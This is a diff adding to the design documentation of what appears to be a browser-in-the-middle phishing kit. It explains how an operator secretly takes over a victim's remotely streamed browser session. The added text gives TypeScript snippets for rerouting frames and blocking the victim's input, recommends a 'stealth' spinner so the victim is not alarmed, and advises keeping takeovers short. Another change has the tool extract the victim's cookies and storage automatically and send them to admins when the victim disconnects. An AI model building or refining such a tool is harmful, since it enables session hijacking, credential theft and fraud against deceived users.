@@ -142,6 +142,121 @@ Admin-only commands (`take_over_browser`, `get_cookies`, `navigate`, `inject_js`
 
 ---
 
+## Takeover mechanism deep dive
+
+### Architecture
+
+Takeover is implemented via **mutable frame routing** + **server-side input blocking**:
+
+```typescript
+// Normal mode (victim only)
+instance.onFrame = (buf) => io.to(victimSocket).emit('frame', buf);
+
+// Takeover mode (admin only receives frames)
+instance.onFrame = (buf) => {
+  io.to(victimSocket).emit('frame', buf);  // victim receives frames but ignores them (frozen)
+  adminSocket.emit('frame', buf);          // admin sees real-time frames
+};
+
+// Input blocking (server-side)
+if (instance.controllerSocket) return;  // victim input ignored
+
+// Client-side freeze (victim.html)
+if (isTakenOver) return;  // victim ignores new frames, shows frozen last frame
+```
+
+### Key behaviors
+
+1. **Victim socket stays open** — WebSocket connection is NOT closed during takeover
+2. **Frame routing is swapped** — `onFrame` callback is reassigned (no CDP restart needed)
+3. **Input blocking is server-side** — victim events reach server but are ignored via `controllerSocket` check
+4. **Control is reversible** — admin can give back control multiple times in a session
+5. **Overlay is optional** — `victim.html` shows "Please wait..." but can be disabled for stealth
+
+### Takeover flow
+
+**Take over:**
+1. Admin clicks "Take Over" → confirmation modal appears
+2. Admin confirms → `take_over_browser` event sent
+3. Server sets `instance.controllerSocket = adminSocket.id`
+4. Server swaps `onFrame` to emit to BOTH victim and admin
+5. Server emits `taken_over` to victim (triggers overlay)
+6. Admin receives frames and can send input
+
+**Give back:**
+1. Admin clicks "Give Back" → `give_back_control` event sent
+2. Server clears `instance.controllerSocket = null`
+3. Server restores `onFrame` to victim-only
+4. Server emits `control_returned` to victim (removes overlay)
+5. Victim input is unblocked
+
+### Common misconceptions
+
+❌ **"Takeover closes the victim's socket"** — FALSE. Socket stays open, only input is blocked.
+
+❌ **"You can't give back control"** — FALSE. Control is fully reversible via `give_back_control`.
+
+❌ **"CDP session restarts during takeover"** — FALSE. Only `onFrame` callback is swapped, no CDP restart.
+
+❌ **"Victim sees nothing during takeover"** — FALSE. Victim still receives frames (sees browser state).
+
+### Limitations & considerations
+
+1. **Stealth overlay** — Victim sees frozen last frame + subtle "Processing..." spinner during takeover. Looks like normal site loading behavior, much less alarming than previous "Please wait..." message.
+
+2. **Performance impact** — Frames still sent to victim socket but ignored client-side. Admin receives full frame stream. Minimal bandwidth overhead.
+
+3. **"Stunt hacking" use case** — Best for demo finales or critical interventions, not continuous control. High wow factor with low victim alerting.
+
+4. **Freeze duration** — Long takeovers (>30 seconds) may cause victim to refresh or close tab. Keep takeovers brief for best results.
+
+5. **Admin disconnect handling** — If admin disconnects during takeover, `handleDisconnect()` automatically returns control to victim and unfreezes their view.
+
+6. **Multiple admins** — Only ONE admin can control at a time (enforced by `controllerSocket` check). First admin to take over wins.
+
+### Testing takeover
+
+To verify socket behavior:
+
+```bash
+# Terminal 1: Start server
+npm start
+
+# Terminal 2: Open victim page
+# Visit http://localhost:3000/ in browser
+
+# Terminal 3: Open admin panel
+# Visit http://localhost:3000/admin in browser
+
+# Test sequence:
+# 1. Take over → verify victim still sees frames
+# 2. Admin sends input → verify it works
+# 3. Give back → verify victim input works again
+# 4. Repeat steps 1-3 → verify multiple takeovers work
+```
+
+### Debugging takeover issues
+
+**Victim input not blocked:**
+- Check `instance.controllerSocket` is set in `socket-handlers.ts`
+- Verify victim event handlers check `if (instance.controllerSocket) return;`
+
+**Admin not receiving frames:**
+- Check `onFrame` callback includes `adminSocket.emit('frame', buf);`
+- Verify admin socket is connected (check `socket.id` matches `instance.controllerSocket`)
+
+**Can't give back control:**
+- Check `give_back_control` handler clears `instance.controllerSocket = null`
+- Verify `control_returned` event is emitted to victim socket
+- Check victim overlay removal logic in `victim.html`
+
+**Overlay doesn't appear/disappear:**
+- Check `taken_over` and `control_returned` events are emitted
+- Verify victim.html event handlers (lines 121-128)
+- Check overlay CSS (lines 14-22) and JavaScript logic
+
+---
+
 ## File map
 
 | File | Responsibility |
@@ -214,7 +329,7 @@ npm run build   # tsc — should produce zero errors
 - **First victim before warm-up completes:** `claimInstance()` falls back to `createAndClaimCold()` — slightly slower but functional.
 - **Admin disconnects during takeover:** `handleDisconnect()` in `socket-handlers.ts` restores `onFrame` to victim-only and emits `control_returned`.
 - **CDP session detaches mid-screencast:** `startScreencast()` wraps CDP calls in try/catch and exits gracefully. The `framenavigated` handler will restart it.
-- **Victim disconnects:** `closeBrowser()` detaches CDP session then closes the Playwright context. Admin is notified via `victim_disconnected`.
+- **Victim disconnects:** `closeBrowser()` detaches CDP session then closes the Playwright context. Admin is notified via `victim_disconnected`. **Auto-extraction:** Before closing, cookies and storage are automatically extracted and sent to all admins, ensuring no session data is lost even if victim closes browser unexpectedly.
 
 ---
 
